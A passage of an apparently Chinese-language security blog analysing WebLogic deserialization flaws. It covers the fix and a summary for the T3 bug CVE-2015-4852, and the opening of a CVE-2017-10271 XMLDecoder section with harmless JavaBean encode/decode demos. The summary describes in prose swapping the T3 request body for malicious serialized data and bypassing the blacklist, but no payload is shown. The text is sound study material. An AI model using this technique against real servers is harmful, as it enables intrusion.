+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204199d69b7.png" alt="image-20250424231103989" srcset="https://bu.dusays.com/2025/05/11/68204199d69b7.png?size=small, https://bu.dusays.com/2025/05/11/68204199d69b7.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204199d69b7.png?size=large 2x" data-title="image-20250424231103989" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="漏洞修复" class="heading-element"><span>漏洞修复</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>上面分析我们可以看出加载类其实是通过调用 <code>resolveClass()</code> 方法，再通过反射获取到任意类的，官方给出的修复就是在这个方法中加入黑名单</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041762e215.png" alt="image-20250425175438583" srcset="https://bu.dusays.com/2025/05/11/682041762e215.png?size=small, https://bu.dusays.com/2025/05/11/682041762e215.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041762e215.png?size=large 2x" data-title="image-20250425175438583" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>因为这里是通过 T3 协议的请求来打，可以让 Web 代理的方式只能转发 HTTP 的请求，这样也能防住</p>
+<h3 id="小结" class="heading-element"><span>小结</span>
+  <a href="#%e5%b0%8f%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>挺简单的，用 T3 协议时会反序列化请求主体中除一些固定数据（T3 协议自带的数据）外的数据，改这部分为恶意序列化数据就好了</p>
+<p>后续就是加补丁，可以找黑名单外的类绕过，还能打 jrmp</p>
+<h3 id="参考" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D</a></p>
+<p><a href="https://ilikeoyt.github.io/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"target="_blank" rel="external nofollow noopener noreferrer">https://ilikeoyt.github.io/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p>
+<p><a href="https://xz.aliyun.com/news/9813"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/9813</a></p>
+<h2 id="weblogic-xmldecoder反序列化cve-2017-10271" class="heading-element"><span>WebLogic XMLDecoder反序列化（CVE-2017-10271）</span>
+  <a href="#weblogic-xmldecoder%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96cve-2017-10271" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="前置学习" class="heading-element"><span>前置学习</span>
+  <a href="#%e5%89%8d%e7%bd%ae%e5%ad%a6%e4%b9%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这里环境还是用的 jdk7u21 + weblogic 10.3.6</p>
+<h4 id="xmlencoder-和-xmldecoder" class="heading-element"><span>XMLEncoder 和 XMLDecoder</span>
+  <a href="#xmlencoder-%e5%92%8c-xmldecoder" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>XMLDecoder/XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示  JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的 XML 文档获取  JavaBeans。</p>
+<p>简单来说就是 Encoder 把 javabeans 变成 xml 格式，Decoder 把 xml 格式变成 Javabeans</p>
+<h5 id="demo" class="heading-element"><span>demo</span>
+  <a href="#demo" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>写个标准的 javabean 类方便后续 encoder 处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">person</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//XMLEncoder要求类必须是标准的 JavaBean,必须有无参构造方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">person</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">person</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="encoder" class="heading-element"><span>Encoder</span>
+  <a href="#encoder" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.XMLEncoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileNotFoundException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">encoder</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">FileNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">person</span><span class="p">(</span><span class="s">&#34;6s6&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">18</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;encode.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XMLEncoder</span><span class="w"> </span><span class="n">encoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLEncoder</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">encoder</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">person1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">encoder</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出的encoder.xml为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&#34;1.7.0_21&#34;</span> <span class="na">class=</span><span class="s">&#34;java.beans.XMLDecoder&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;object</span> <span class="na">class=</span><span class="s">&#34;org.example.person&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;void</span> <span class="na">property=</span><span class="s">&#34;age&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;int&gt;</span>18<span class="nt">&lt;/int&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/void&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;void</span> <span class="na">property=</span><span class="s">&#34;name&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;string&gt;</span>6s6<span class="nt">&lt;/string&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/void&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/object&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/java&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="decoder" class="heading-element"><span>Decoder</span>
+  <a href="#decoder" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.XMLDecoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileNotFoundException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">decoder</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">FileNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;D:\\14.Java\\java_test\\test\\encode.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XMLDecoder</span><span class="w"> </span><span class="n">decoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLDecoder</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="w"> </span><span class="n">decodedPerson</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">person</span><span class="p">)</span><span class="w"> </span><span class="n">decoder</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">decodedPerson</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Age: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">decodedPerson</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Name: 6s6
+</span></span><span class="line"><span class="cl">Age: 18</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="xml基础属性" class="heading-element"><span>XML基础属性</span>
+  <a href="#xml%e5%9f%ba%e7%a1%80%e5%b1%9e%e6%80%a7" class="heading-mark">
